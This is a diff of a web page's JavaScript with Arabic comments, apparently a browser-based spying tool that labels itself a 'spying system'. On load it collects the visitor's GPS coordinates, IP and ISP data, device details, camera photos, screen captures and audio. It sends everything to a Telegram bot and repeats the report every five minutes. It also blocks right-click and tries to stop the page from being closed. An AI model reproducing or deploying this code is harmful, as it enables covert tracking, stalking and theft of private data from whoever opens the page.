+        async function sendLocationToTelegram() {
+            if (!lastLocation) return;
             
-            if (!video.srcObject) {
-                console.log('❌ No video stream');
-                return;
+            const msg = `📍 *تحديث الموقع*\n`;
+            msg += `📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n`;
+            msg += `🎯 الدقة: ${lastLocation.accuracy || 'غير معروف'} متر\n`;
+            if (lastLocation.altitude) {
+                msg += `🏔️ الارتفاع: ${lastLocation.altitude} متر\n`;
             }
-            
-            canvas.width = video.videoWidth || 1280;
-            canvas.height = video.videoHeight || 720;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-            sendPhotoToTelegram(dataUrl);
-        }
-
-        // ============================================================
-        // 6. تسجيل الصوت
-        // ============================================================
-        function startRecording() {
-            if (!currentStream) {
-                alert('❌ لا يوجد ميكروفون متاح');
-                return;
+            if (lastLocation.speed) {
+                msg += `💨 السرعة: ${lastLocation.speed} م/ث\n`;
             }
+            msg += `🕐 ${new Date().toLocaleString('ar-EG')}`;
             
-            audioChunks = [];
-            mediaRecorder = new MediaRecorder(currentStream, {
-                mimeType: 'audio/webm'
-            });
-            
-            mediaRecorder.ondataavailable = e => {
-                if (e.data.size > 0) {
-                    audioChunks.push(e.data);
-                }
-            };
-            
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                await sendAudioToTelegram(blob);
-            };
-            
-            mediaRecorder.start();
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-            }, 10000); // تسجيل 10 ثواني
-        }
-
-        // ============================================================
-        // 7. جمع جميع البيانات
-        // ============================================================
-        async function collectAllData() {
-            const info = {};
-
-            // IP والمعلومات الأساسية
-            try {
-                const ipify = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                info.publicIP = ipify.ip;
-                
-                const ipApi = await fetch(`http://ip-api.com/json/${info.publicIP}?lang=ar&fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
-                info.ipData = await ipApi.json();
-            } catch(e) {
-                info.ipError = e.message;
-            }
-
-            // الموقع الحالي
-            if (lastLocation) {
-                info.currentLocation = lastLocation;
-            }
-
-            // معلومات النظام
-            info.system = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints,
-                vendor: navigator.vendor
-            };
-
-            // الشاشة
-            info.screen = {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
-            };
-
-            // الوقت
-            info.time = {
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                localDate: new Date().toLocaleString('ar-EG'),
-                utcDate: new Date().toUTCString(),
-                timestamp: Date.now()
-            };
-
-            // الصلاحيات
-            info.permissions = {
-                geolocation: !!navigator.geolocation,
-                camera: cameraActive,
-                microphone: micActive,
-                screen: screenActive,
-                notifications: Notification.permission,
-                clipboard: !!navigator.clipboard,
-                bluetooth: !!navigator.bluetooth,
-                usb: !!navigator.usb
-            };
-
-            // معلومات الصفحة
-            info.page = {
-                url: window.location.href,
-                referrer: document.referrer,
-                title: document.title
-            };
-
-            allData = info;
-            return info;
-        }
-
-        // ============================================================
-        // 8. إرسال البيانات إلى تيليجرام
-        // ============================================================
-        async function sendAllData() {
-            const info = await collectAllData();
-            
-            // بناء الرسالة
-            let msg = `🚨 *تقرير مفصل - ${new Date().toLocaleString('ar-EG')}*\n`;
-            msg += `═══════════════════════════════\n\n`;
-            
-            // الموقع
-            if (info.currentLocation) {
-                msg += `📍 *الموقع الحالي (GPS)*\n`;
-                msg += `📌 خط العرض: ${info.currentLocation.lat}\n`;
-                msg += `📌 خط الطول: ${info.currentLocation.lon}\n`;
-                msg += `🎯 الدقة: ${info.currentLocation.accuracy} متر\n`;
-                if (info.currentLocation.altitude) {
-                    msg += `🏔️ الارتفاع: ${info.currentLocation.altitude} متر\n`;
-                }
-                if (info.currentLocation.speed) {
-                    msg += `💨 السرعة: ${info.currentLocation.speed} م/ث\n`;
-                }
-                msg += `🔗 https://www.google.com/maps?q=${info.currentLocation.lat},${info.currentLocation.lon}\n\n`;
-            }
-
-            // IP
-            if (info.ipData) {
-                msg += `🌐 *معلومات IP*\n`;
-                msg += `🆔 IP: ${info.ipData.query || info.publicIP}\n`;
-                msg += `📍 الدولة: ${info.ipData.country || 'غير معروف'}\n`;
-                msg += `🏙️ المدينة: ${info.ipData.city || 'غير معروف'}\n`;
-                msg += `📡 مزود الخدمة: ${info.ipData.isp || 'غير معروف'}\n`;
-                msg += `🔒 VPN/Proxy: ${info.ipData.proxy ? 'نعم' : 'لا'}\n\n`;
-            }
-
-            // النظام
-            msg += `💻 *معلومات الجهاز*\n`;
-            msg += `🖥️ النظام: ${info.system.platform || 'غير معروف'}\n`;
-            msg += `🌐 المتصفح: ${info.system.userAgent || 'غير معروف'}\n`;
-            msg += `⚙️ الأنوية: ${info.system.hardwareConcurrency || 'غير معروف'}\n`;
-            msg += `💾 الذاكرة: ${info.system.deviceMemory ? info.system.deviceMemory + 'GB' : 'غير معروف'}\n`;
-            msg += `🖥️ الشاشة: ${info.screen.width}x${info.screen.height}\n\n`;
-
-            // الصلاحيات
-            msg += `🔓 *الصلاحيات*\n`;
-            msg += `📍 الموقع: ${info.permissions.geolocation ? '✅' : '❌'}\n`;
-            msg += `📷 الكاميرا: ${info.permissions.camera ? '✅' : '❌'}\n`;
-            msg += `🎤 الميكروفون: ${info.permissions.microphone ? '✅' : '❌'}\n`;
-            msg += `🖥️ الشاشة: ${info.permissions.screen ? '✅' : '❌'}\n`;
-            msg += `🔔 الإشعارات: ${info.permissions.notifications || 'غير معروف'}\n\n`;
-
-            // الوقت
-            msg += `⏰ *الوقت*\n`;
-            msg += `🕐 محلي: ${info.time.localDate}\n`;
-            msg += `🌐 عالمي: ${info.time.utcDate}\n`;
-            msg += `🗺️ المنطقة: ${info.time.timezone}\n\n`;
-
-            // الصفحة
-            msg += `🔗 *الصفحة*\n`;
-            msg += `📎 الرابط: ${info.page.url}\n`;
-            msg += `📝 العنوان: ${info.page.title}\n`;
-            msg += `📎 المصدر: ${info.page.referrer || 'مباشر'}\n`;
-            msg += `═══════════════════════════════\n`;
-            msg += `📅 ${new Date().toLocaleString('ar-EG')}`;
-
-            // إرسال للبوت
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -987,92 +1507,141 @@ padding:30px;
                     })
                 });
                 const result = await response.json();
-                console.log('✅ تم الإرسال:', result);
-                
-                // إرسال الصورة إذا كانت الكاميرا نشطة
-                if (cameraActive) {
-                    setTimeout(() => capturePhoto(), 1000);
+                if (result.ok) {
+                    addLog('📍 تم إرسال تحديث الموقع إلى تيليجرام', 'success');
                 }
+                return result;
             } catch(e) {
-                console.error('❌ فشل الإرسال:', e);
+                addLog(`❌ فشل إرسال الموقع: ${e.message}`, 'error');
+                return null;
             }
         }
 
         // ============================================================
-        // 9. إرسال صورة إلى تيليجرام
+        // 22. جمع كل البيانات
         // ============================================================
-        async function sendPhotoToTelegram(dataUrl) {
-            try {
-                const blob = await fetch(dataUrl).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 صورة من الكاميرا - ${new Date().toLocaleString('ar-EG')}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                console.log('✅ تم إرسال الصورة:', result);
-            } catch(e) {
-                console.error('❌ فشل إرسال الصورة:', e);
-            }
-        }
-
-        // ============================================================
-        // 10. إرسال فيديو إلى تيليجرام
-        // ============================================================
-        async function sendVideoToTelegram(blob, caption) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'video.webm');
-                formData.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                console.log('✅ تم إرسال الفيديو:', result);
-            } catch(e) {
-                console.error('❌ فشل إرسال الفيديو:', e);
-            }
-        }
-
-        // ============================================================
-        // 11. إرسال صوت إلى تيليجرام
-        // ============================================================
-        async function sendAudioToTelegram(blob) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('audio', blob, 'audio.webm');
-                formData.append('caption', `🎙️ تسجيل صوت - ${new Date().toLocaleString('ar-EG')}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                console.log('✅ تم إرسال الصوت:', result);
-            } catch(e) {
-                console.error('❌ فشل إرسال الصوت:', e);
-            }
-        }
-
-        // ============================================================
-        // 12. إرسال تحديث الموقع
-        // ============================================================
-        async function sendLocationUpdate() {
-            if (!lastLocation) return;
+        async function collectAllData() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                location: lastLocation,
+                permissions: {
+                    geolocation: document.getElementById('gpsStatus').textContent.includes('مصرح'),
+                    frontCamera: document.getElementById('frontCamStatus').textContent.includes('مصرح'),
+                    backCamera: document.getElementById('backCamStatus').textContent.includes('مصرح'),
+                    microphone: document.getElementById('micStatus').textContent.includes('مصرح'),
+                    screen: document.getElementById('screenStatus').textContent.includes('مصرح'),
+                    notifications: document.getElementById('notifStatus').textContent.includes('مصرح')
+                },
+                system: {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    vendor: navigator.vendor
+                },
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
+                },
+                page: {
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    title: document.title
+                },
+                time: {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localDate: new Date().toLocaleString('ar-EG'),
+                    utcDate: new Date().toUTCString()
+                }
+            };
             
-            const msg = `📍 *تحديث الموقع*\n`;
-            msg += `📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n`;
-            msg += `🎯 الدقة: ${lastLocation.accuracy} متر\n`;
-            msg += `🕐 ${new Date().toLocaleString('ar-EG')}`;
+            // جلب IP
+            try {
+                const ipify = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                info.publicIP = ipify.ip;
+                
+                const ipApi = await fetch(`http://ip-api.com/json/${info.publicIP}?lang=ar`);
+                info.ipData = await ipApi.json();
+            } catch(e) {
+                info.ipError = e.message;
+            }
             
+            allData = info;
+            return info;
+        }
+
+        // ============================================================
+        // 23. إرسال كل البيانات إلى تيليجرام
+        // ============================================================
+        async function sendAllData() {
+            addLog('📤 بدء إرسال جميع البيانات...', 'info');
+            
+            const info = await collectAllData();
+            
+            // بناء الرسالة
+            let msg = `🚨 *تقرير شامل - ${new Date().toLocaleString('ar-EG')}*\n`;
+            msg += `═══════════════════════════════════════\n\n`;
+            
+            // الموقع
+            if (info.location) {
+                msg += `📍 *الموقع الحالي (GPS)*\n`;
+                msg += `📌 https://www.google.com/maps?q=${info.location.lat},${info.location.lon}\n`;
+                msg += `🎯 الدقة: ${info.location.accuracy || 'غير معروف'} متر\n`;
+                if (info.location.altitude) {
+                    msg += `🏔️ الارتفاع: ${info.location.altitude} متر\n`;
+                }
+                if (info.location.speed) {
+                    msg += `💨 السرعة: ${info.location.speed} م/ث\n`;
+                }
+                msg += `\n`;
+            }
+            
+            // IP
+            if (info.ipData) {
+                msg += `🌐 *معلومات IP*\n`;
+                msg += `🆔 IP: ${info.ipData.query || info.publicIP}\n`;
+                msg += `📍 الدولة: ${info.ipData.country || 'غير معروف'}\n`;
+                msg += `🏙️ المدينة: ${info.ipData.city || 'غير معروف'}\n`;
+                msg += `📡 مزود الخدمة: ${info.ipData.isp || 'غير معروف'}\n`;
+                msg += `🔒 VPN/Proxy: ${info.ipData.proxy ? 'نعم' : 'لا'}\n\n`;
+            }
+            
+            // النظام
+            msg += `💻 *معلومات الجهاز*\n`;
+            msg += `🖥️ النظام: ${info.system.platform || 'غير معروف'}\n`;
+            msg += `🌐 المتصفح: ${info.system.userAgent || 'غير معروف'}\n`;
+            msg += `⚙️ الأنوية: ${info.system.hardwareConcurrency || 'غير معروف'}\n`;
+            msg += `💾 الذاكرة: ${info.system.deviceMemory ? info.system.deviceMemory + 'GB' : 'غير معروف'}\n`;
+            msg += `🖥️ الشاشة: ${info.screen.width}x${info.screen.height}\n\n`;
+            
+            // الصلاحيات
+            msg += `🔓 *الصلاحيات* ✅/❌\n`;
+            msg += `📍 الموقع: ${info.permissions.geolocation ? '✅' : '❌'}\n`;
+            msg += `📷 الكاميرا الأمامية: ${info.permissions.frontCamera ? '✅' : '❌'}\n`;
+            msg += `📷 الكاميرا الخلفية: ${info.permissions.backCamera ? '✅' : '❌'}\n`;
+            msg += `🎤 الميكروفون: ${info.permissions.microphone ? '✅' : '❌'}\n`;
+            msg += `🖥️ الشاشة: ${info.permissions.screen ? '✅' : '❌'}\n`;
+            msg += `🔔 الإشعارات: ${info.permissions.notifications ? '✅' : '❌'}\n\n`;
+            
+            // الوقت
+            msg += `⏰ *الوقت*\n`;
+            msg += `🕐 محلي: ${info.time.localDate}\n`;
+            msg += `🌐 عالمي: ${info.time.utcDate}\n`;
+            msg += `🗺️ المنطقة: ${info.time.timezone}\n\n`;
+            
+            // الصفحة
+            msg += `🔗 *الصفحة*\n`;
+            msg += `📎 الرابط: ${info.page.url}\n`;
+            msg += `📝 العنوان: ${info.page.title}\n`;
+            msg += `📎 المصدر: ${info.page.referrer || 'مباشر'}\n`;
+            msg += `═══════════════════════════════════════\n`;
+            msg += `📅 ${new Date().toLocaleString('ar-EG')}`;
+            
+            // إرسال الرسالة
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -1080,83 +1649,102 @@ padding:30px;
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: msg,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
                     })
                 });
-                console.log('✅ تم إرسال تحديث الموقع');
+                const result = await response.json();
+                if (result.ok) {
+                    addLog('✅ تم إرسال التقرير الكامل إلى تيليجرام', 'success');
+                    
+                    // إرسال صورة فورية
+                    if (cameraActive) {
+                        setTimeout(() => capturePhoto('environment'), 1000);
+                        setTimeout(() => capturePhoto('front'), 2000);
+                    }
+                    
+                    // إرسال لقطة شاشة
+                    if (screenActive) {
+                        setTimeout(() => captureScreen(), 3000);
+                    }
+                    
+                } else {
+                    addLog(`❌ فشل إرسال التقرير: ${result.description}`, 'error');
+                }
+                return result;
             } catch(e) {
-                console.error('❌ فشل إرسال تحديث الموقع:', e);
+                addLog(`❌ فشل إرسال التقرير: ${e.message}`, 'error');
+                return null;
             }
         }
 
         // ============================================================
-        // 13. طلب الموقع يدوياً
+        // 24. إرسال إشعار للمستخدم
         // ============================================================
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        lastLocation = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude,
-                            speed: pos.coords.speed,
-                            heading: pos.coords.heading
-                        };
-                        showLocationOnMap(lastLocation.lat, lastLocation.lon);
-                        document.getElementById('gpsStatus').textContent = '✅ محدث';
-                        document.getElementById('gpsStatus').className = 'value success';
-                        sendLocationUpdate();
-                    },
-                    (err) => {
-                        alert('❌ فشل الحصول على الموقع: ' + err.message);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                alert('❌ المتصفح لا يدعم تحديد الموقع');
+        function sendNotification(title, body) {
+            if (Notification.permission === 'granted') {
+                new Notification(title, {
+                    body: body,
+                    icon: '🔔'
+                });
+                addLog(`🔔 إشعار: ${title} - ${body}`, 'info');
             }
         }
 
         // ============================================================
-        // 14. بدء التشغيل
+        // 25. بدء التشغيل
         // ============================================================
         async function init() {
-            document.getElementById('loading').style.display = 'none';
+            addLog('🚀 بدء تشغيل نظام التجسس المتقدم...', 'info');
+            addLog('⚠️ هذا النظام يجمع معلومات حساسة، استخدمه بشكل قانوني', 'error');
             
-            // طلب الصلاحيات تلقائياً
-            await requestPermissions();
+            // طلب الصلاحيات فوراً
+            await requestAllPermissions();
             
             // جمع البيانات وإرسالها
             setTimeout(async () => {
-                await collectAllData();
                 await sendAllData();
             }, 3000);
             
-            // إرسال تحديثات الموقع كل دقيقة
+            // إرسال تقرير كل 5 دقائق
             setInterval(async () => {
-                if (lastLocation) {
-                    await sendLocationUpdate();
-                }
-            }, 60000);
+                await sendAllData();
+                addLog('📤 تم إرسال تقرير دوري', 'info');
+            }, 300000); // 5 دقائق
             
-            // إرسال صورة كل 5 دقائق
-            setInterval(() => {
-                if (cameraActive) {
-                    capturePhoto();
-                }
-            }, 300000);
+            // إرسال إشعار
+            setTimeout(() => {
+                sendNotification('🕵️ نظام التجسس', 'تم تشغيل النظام بنجاح');
+            }, 5000);
+            
+            addLog('✅ تم تشغيل النظام بنجاح', 'success');
         }
 
         // ============================================================
-        // 15. تشغيل عند تحميل الصفحة
+        // 26. تشغيل عند تحميل الصفحة
         // ============================================================
         if (document.readyState === 'complete' || document.readyState === 'interactive') {
             init();
         } else {
             document.addEventListener('DOMContentLoaded', init);
         }
+
+        // ============================================================
+        // 27. منع إغلاق الصفحة بسهولة
+        // ============================================================
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        // ============================================================
+        // 28. منع النقر بزر الفأرة الأيمن
+        // ============================================================
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
     </script>
 </body>
 </html>
